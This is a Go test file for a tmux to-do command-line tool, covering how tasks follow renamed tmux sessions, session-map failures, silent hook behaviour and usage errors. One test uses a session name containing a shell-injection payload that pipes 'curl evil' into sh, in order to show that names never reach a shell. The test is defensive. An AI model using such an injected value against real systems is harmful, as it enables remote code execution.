package cli

import (
	"bytes"
	"context"
	"log"
	"os"
	"strings"
	"testing"

	"github.com/agusarias/tmux-todo/internal/store"
	"github.com/agusarias/tmux-todo/internal/task"
)

// seedDB opens the database at path so a test can prepare rows, then closes it.
func seedDB(t *testing.T, path string, seed func(ctx context.Context, db *store.DB)) {
	t.Helper()
	db, err := store.Open(path)
	if err != nil {
		t.Fatalf("store.Open(%s): %v", path, err)
	}
	defer db.Close()
	seed(context.Background(), db)
}

func sessionTask(t *testing.T, db *store.DB, ctx context.Context, text, key string) {
	t.Helper()
	if _, err := db.Add(ctx, text, task.Scope{Kind: task.ScopeSession, Key: key}); err != nil {
		t.Fatalf("Add(%q): %v", text, err)
	}
}

// sessionKeys lists the scope keys of every session-scoped task, so a test can
// assert on where the tasks ended up rather than on a return value.
func sessionKeys(t *testing.T, path string) []string {
	t.Helper()
	db, err := store.Open(path)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	defer db.Close()
	tasks, err := db.List(context.Background(), store.Filter{IncludeDone: true})
	if err != nil {
		t.Fatalf("List: %v", err)
	}
	var keys []string
	for _, tk := range tasks {
		if tk.Scope.Kind == task.ScopeSession {
			keys = append(keys, tk.Scope.Key)
		}
	}
	return keys
}

func mappedName(t *testing.T, path, id string) (string, error) {
	t.Helper()
	db, err := store.Open(path)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	defer db.Close()
	return db.SessionName(context.Background(), id)
}

// captureLog redirects the standard logger, which is the only place a swallowed
// session-map failure surfaces.
func captureLog(t *testing.T) *bytes.Buffer {
	t.Helper()
	var buf bytes.Buffer
	flags := log.Flags()
	log.SetOutput(&buf)
	log.SetFlags(0)
	t.Cleanup(func() {
		log.SetOutput(os.Stderr)
		log.SetFlags(flags)
	})
	return &buf
}

// TestAddRecordsTheSessionMap is DoD 6 through the production wiring: an
// ordinary command resolves a session, and the id -> name mapping is there
// afterwards. It asserts through the real store rather than a stub, so deleting
// the recordSession call from openEnv fails it.
func TestAddRecordsTheSessionMap(t *testing.T) {
	fakeContext{session: "pulsar", sessionID: "$3", dir: t.TempDir()}.install(t)
	path := newDB(t)

	if code, _, stderr := run(t, "add", "--db", path, "rebase onto main", "--session"); code != 0 {
		t.Fatalf("exit code %d, want 0 (stderr: %s)", code, stderr)
	}

	name, err := mappedName(t, path, "$3")
	if err != nil {
		t.Fatalf("SessionName($3): %v", err)
	}
	if name != "pulsar" {
		t.Errorf("mapped name = %q, want %q", name, "pulsar")
	}
}

// Outside tmux, and inside a tmux too old to report an id, there is nothing to
// record — and an empty key must never reach the map.
func TestNoSessionMeansNoMapRow(t *testing.T) {
	for _, tc := range []struct {
		name string
		ctx  fakeContext
	}{
		{"outside tmux", fakeContext{dir: t.TempDir()}},
		{"no session id reported", fakeContext{session: "pulsar", dir: t.TempDir()}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			tc.ctx.install(t)
			path := newDB(t)
			if code, _, stderr := run(t, "add", "--db", path, "something", "--global"); code != 0 {
				t.Fatalf("exit code %d, want 0 (stderr: %s)", code, stderr)
			}
			db, err := store.Open(path)
			if err != nil {
				t.Fatalf("store.Open: %v", err)
			}
			defer db.Close()
			var rows int
			if err := db.QueryRowContext(context.Background(), `SELECT count(*) FROM sessions`).Scan(&rows); err != nil {
				t.Fatalf("count sessions: %v", err)
			}
			if rows != 0 {
				t.Errorf("%d rows in sessions, want 0", rows)
			}
		})
	}
}

// TestSessionMapFailureDoesNotFailTheCommand is the other half of DoD 6. The
// failure is real, not stubbed: the sessions table is dropped, so the upsert
// hits SQLite and loses. The command must still do its job and exit 0, and the
// failure must surface no further than the log.
func TestSessionMapFailureDoesNotFailTheCommand(t *testing.T) {
	fakeContext{session: "pulsar", sessionID: "$3", dir: t.TempDir()}.install(t)
	path := newDB(t)
	seedDB(t, path, func(ctx context.Context, db *store.DB) {
		if _, err := db.ExecContext(ctx, `DROP TABLE sessions`); err != nil {
			t.Fatalf("DROP TABLE sessions: %v", err)
		}
	})

	logged := captureLog(t)
	code, stdout, stderr := run(t, "add", "--db", path, "rebase onto main", "--session")
	if code != 0 {
		t.Fatalf("exit code %d, want 0 — a stale map must not stop a command (stderr: %s)", code, stderr)
	}
	if strings.TrimSpace(stdout) == "" {
		t.Error("add printed no id, so the task was not filed")
	}
	if stderr != "" {
		t.Errorf("stderr = %q, want empty: the failure belongs in the log, not in the command's output", stderr)
	}
	if !strings.Contains(logged.String(), "record session name") {
		t.Errorf("the failure was not logged at all: %q", logged.String())
	}
	if got := sessionKeys(t, path); len(got) != 1 || got[0] != "pulsar" {
		t.Errorf("session tasks = %v, want the task filed under pulsar anyway", got)
	}
}

// TestSessionRenamedMovesTasks is DoD 7: the rewrite driven by the new name
// alone, through an injected runner and with no tmux server anywhere.
func TestSessionRenamedMovesTasks(t *testing.T) {
	calls := 0
	fakeContext{
		namedSessions: map[string]string{"new": "$3"},
		tmuxCalls:     &calls,
	}.install(t)
	path := newDB(t)
	seedDB(t, path, func(ctx context.Context, db *store.DB) {
		sessionTask(t, db, ctx, "rebase onto main", "old")
		sessionTask(t, db, ctx, "someone else", "untouched")
		if err := db.RecordSession(ctx, "$3", "old"); err != nil {
			t.Fatalf("RecordSession: %v", err)
		}
	})

	code, stdout, stderr := run(t, "session-renamed", "--db", path, "--", "new")
	if code != 0 {
		t.Fatalf("exit code %d, want 0 (stderr: %s)", code, stderr)
	}
	if stdout != "" || stderr != "" {
		t.Errorf("the hook path must be silent, got stdout %q stderr %q", stdout, stderr)
	}
	got := sessionKeys(t, path)
	if len(got) != 2 {
		t.Fatalf("session tasks = %v, want 2", got)
	}
	if !contains(got, "new") || !contains(got, "untouched") || contains(got, "old") {
		t.Errorf("session keys = %v, want the old key rewritten to new and untouched left alone", got)
	}
	// The map must now point at the new name, or the *next* rename would rewrite
	// from a name that no longer exists.
	if name, err := mappedName(t, path, "$3"); err != nil || name != "new" {
		t.Errorf("mapped name = %q (err %v), want %q", name, err, "new")
	}
	// One subprocess: the targeted id query and nothing else. Going through
	// openEnv would resolve the whole context and cost a second call.
	if calls != 1 {
		t.Errorf("tmux was queried %d times, want 1", calls)
	}
}

// TestSessionRenamedWhenItIsTheCurrentSession is the guard for the ordering trap
// this command exists inside: when the hook fires, the renamed session *is* the
// one the process is running in. Refreshing the map before reading it — which is
// exactly what openEnv does — would record $3 -> "new" first, so the lookup would
// find the new name, conclude there was nothing to do, and orphan the tasks.
// Delete the openStore call in favour of openEnv and this test fails while every
// other one in this file still passes.
func TestSessionRenamedWhenItIsTheCurrentSession(t *testing.T) {
	fakeContext{
		session:       "new",
		sessionID:     "$3",
		dir:           t.TempDir(),
		namedSessions: map[string]string{"new": "$3"},
	}.install(t)
	path := newDB(t)
	seedDB(t, path, func(ctx context.Context, db *store.DB) {
		sessionTask(t, db, ctx, "rebase onto main", "old")
		if err := db.RecordSession(ctx, "$3", "old"); err != nil {
			t.Fatalf("RecordSession: %v", err)
		}
	})

	if code, _, stderr := run(t, "session-renamed", "--db", path, "--", "new"); code != 0 {
		t.Fatalf("exit code %d, want 0 (stderr: %s)", code, stderr)
	}
	if got := sessionKeys(t, path); len(got) != 1 || got[0] != "new" {
		t.Errorf("session keys = %v, want [new] — the map was refreshed before it was read", got)
	}
}

// TestSessionRenamedNoOpsAreSilentSuccesses is DoD 8. The hook runs on every
// rename in the user's tmux, so each of these must exit 0 and say nothing.
func TestSessionRenamedNoOpsAreSilentSuccesses(t *testing.T) {
	for _, tc := range []struct {
		name string
		seed func(ctx context.Context, db *store.DB)
		want []string
	}{{
		name: "unknown session id — tdo never ran here",
		seed: func(ctx context.Context, db *store.DB) {},
		want: nil,
	}, {
		name: "map already holds the new name",
		seed: func(ctx context.Context, db *store.DB) {
			db.RecordSession(ctx, "$3", "new") //nolint:errcheck
		},
		want: nil,
	}, {
		name: "no tasks under the old key",
		seed: func(ctx context.Context, db *store.DB) {
			db.RecordSession(ctx, "$3", "old") //nolint:errcheck
		},
		want: nil,
	}} {
		t.Run(tc.name, func(t *testing.T) {
			fakeContext{namedSessions: map[string]string{"new": "$3"}}.install(t)
			path := newDB(t)
			seedDB(t, path, func(ctx context.Context, db *store.DB) { tc.seed(ctx, db) })

			code, stdout, stderr := run(t, "session-renamed", "--db", path, "--", "new")
			if code != 0 {
				t.Errorf("exit code %d, want 0 (stderr: %s)", code, stderr)
			}
			if stdout != "" || stderr != "" {
				t.Errorf("not silent: stdout %q, stderr %q", stdout, stderr)
			}
		})
	}
}

// --verbose exists so the no-op paths can be proved by hand without making the
// hook chatty. It is the only thing that writes to stdout here.
func TestSessionRenamedVerboseExplainsANoOp(t *testing.T) {
	fakeContext{namedSessions: map[string]string{"new": "$3"}}.install(t)
	path := newDB(t)

	code, stdout, stderr := run(t, "session-renamed", "--db", path, "--verbose", "--", "new")
	if code != 0 {
		t.Fatalf("exit code %d, want 0 (stderr: %s)", code, stderr)
	}
	if !strings.Contains(stdout, "$3") || !strings.Contains(stdout, "nothing to move") {
		t.Errorf("stdout = %q, want it to name the session and say nothing moved", stdout)
	}
}

// A session name with a space and a quote in it must survive the whole path.
// Nothing here goes through a shell — that is the point of passing the name
// rather than the id (see the run-shell $0 trap in CLAUDE.md) — so the name is
// one argv element from tmux's hook to the SQL bind parameter.
func TestSessionRenamedHandlesAwkwardNames(t *testing.T) {
	const newName = `it's a "session"`
	fakeContext{namedSessions: map[string]string{newName: "$3"}}.install(t)
	path := newDB(t)
	seedDB(t, path, func(ctx context.Context, db *store.DB) {
		sessionTask(t, db, ctx, "rebase onto main", "old name with spaces")
		if err := db.RecordSession(ctx, "$3", "old name with spaces"); err != nil {
			t.Fatalf("RecordSession: %v", err)
		}
	})

	if code, _, stderr := run(t, "session-renamed", "--db", path, "--", newName); code != 0 {
		t.Fatalf("exit code %d, want 0 (stderr: %s)", code, stderr)
	}
	if got := sessionKeys(t, path); len(got) != 1 || got[0] != newName {
		t.Errorf("session keys = %v, want [%q]", got, newName)
	}
}

// The merge is design.md:42-43's accepted behaviour, and it is worth pinning at
// this level too: the hook is where a user will actually meet it.
func TestSessionRenamedMergesOntoAnExistingName(t *testing.T) {
	fakeContext{namedSessions: map[string]string{"new": "$3"}}.install(t)
	path := newDB(t)
	seedDB(t, path, func(ctx context.Context, db *store.DB) {
		sessionTask(t, db, ctx, "from the old name", "old")
		sessionTask(t, db, ctx, "already under new", "new")
		if err := db.RecordSession(ctx, "$3", "old"); err != nil {
			t.Fatalf("RecordSession: %v", err)
		}
	})

	if code, _, stderr := run(t, "session-renamed", "--db", path, "--", "new"); code != 0 {
		t.Fatalf("exit code %d, want 0 (stderr: %s)", code, stderr)
	}
	got := sessionKeys(t, path)
	if len(got) != 2 || got[0] != "new" || got[1] != "new" {
		t.Errorf("session keys = %v, want both under new", got)
	}
}

func TestSessionRenamedUsageErrors(t *testing.T) {
	fakeContext{namedSessions: map[string]string{"new": "$3"}}.install(t)
	path := newDB(t)

	for _, tc := range []struct {
		name string
		args []string
		want int
	}{
		{"two names", []string{"session-renamed", "--db", path, "--", "a", "b"}, 2},
		{"unknown session", []string{"session-renamed", "--db", path, "--", "gone"}, 1},
	} {
		code, _, stderr := run(t, tc.args...)
		if code != tc.want {
			t.Errorf("%s: exit code %d, want %d (stderr: %s)", tc.name, code, tc.want, stderr)
		}
		if stderr == "" {
			t.Errorf("%s: nothing on stderr", tc.name)
		}
	}
}

// Outside tmux the command cannot ask which session was renamed, and must say so
// rather than guessing. This can only happen when a user runs it by hand; the
// hook always runs inside tmux.
func TestSessionRenamedOutsideTmuxFails(t *testing.T) {
	fakeContext{dir: t.TempDir()}.install(t)

	code, _, stderr := run(t, "session-renamed", "--db", newDB(t), "--", "new")
	if code != 1 {
		t.Errorf("exit code %d, want 1 (stderr: %s)", code, stderr)
	}
	if !strings.Contains(stderr, "not inside tmux") {
		t.Errorf("stderr does not name the reason: %q", stderr)
	}
}

// TestSessionRenamedWithNoNameUsesTheTmuxEnvironment is the form the installed
// hook uses. It must interpolate nothing: run-shell's child inherits $TMUX, whose
// session field is the one the hook fired for, so the name never passes through a
// shell — which is what keeps a session called `x'; curl evil|sh; '` from being a
// command-injection vector rather than merely an unrecovered rename.
func TestSessionRenamedWithNoNameUsesTheTmuxEnvironment(t *testing.T) {
	calls := 0
	const awkward = `x'; curl evil|sh; '`
	fakeContext{
		session:   awkward,
		sessionID: "$3",
		dir:       t.TempDir(),
		tmuxCalls: &calls,
	}.install(t)
	path := newDB(t)
	seedDB(t, path, func(ctx context.Context, db *store.DB) {
		sessionTask(t, db, ctx, "rebase onto main", "old")
		if err := db.RecordSession(ctx, "$3", "old"); err != nil {
			t.Fatalf("RecordSession: %v", err)
		}
	})

	code, stdout, stderr := run(t, "session-renamed", "--db", path)
	if code != 0 {
		t.Fatalf("exit code %d, want 0 (stderr: %s)", code, stderr)
	}
	if stdout != "" || stderr != "" {
		t.Errorf("not silent: stdout %q, stderr %q", stdout, stderr)
	}
	if got := sessionKeys(t, path); len(got) != 1 || got[0] != awkward {
		t.Errorf("session keys = %v, want [%q]", got, awkward)
	}
	if name, err := mappedName(t, path, "$3"); err != nil || name != awkward {
		t.Errorf("mapped name = %q (err %v), want %q", name, err, awkward)
	}
	// One subprocess: the environment query answers both the name and the id, so
	// the no-argument form costs no more than the named one.
	if calls != 1 {
		t.Errorf("tmux was queried %d times, want 1", calls)
	}
}

// Without a name and without tmux there is nothing to reconcile, and guessing
// would be worse than saying so.
func TestSessionRenamedWithNoNameOutsideTmuxFails(t *testing.T) {
	fakeContext{dir: t.TempDir()}.install(t)

	code, _, stderr := run(t, "session-renamed", "--db", newDB(t))
	if code != 1 {
		t.Errorf("exit code %d, want 1 (stderr: %s)", code, stderr)
	}
	if !strings.Contains(stderr, "not inside tmux") {
		t.Errorf("stderr does not name the reason: %q", stderr)
	}
}

// A tmux that reports a session but no id leaves nothing to look the old name up
// with. It must fail rather than silently do nothing, because unlike the map
// being cold this is a broken assumption, not an expected state.
func TestSessionRenamedWithNoNameNeedsASessionID(t *testing.T) {
	fakeContext{session: "pulsar", dir: t.TempDir()}.install(t)

	code, _, stderr := run(t, "session-renamed", "--db", newDB(t))
	if code != 1 {
		t.Errorf("exit code %d, want 1 (stderr: %s)", code, stderr)
	}
	if !strings.Contains(stderr, "no session id") {
		t.Errorf("stderr does not name the reason: %q", stderr)
	}
}

func contains(ss []string, want string) bool {
	for _, s := range ss {
		if s == want {
			return true
		}
	}
	return false
}
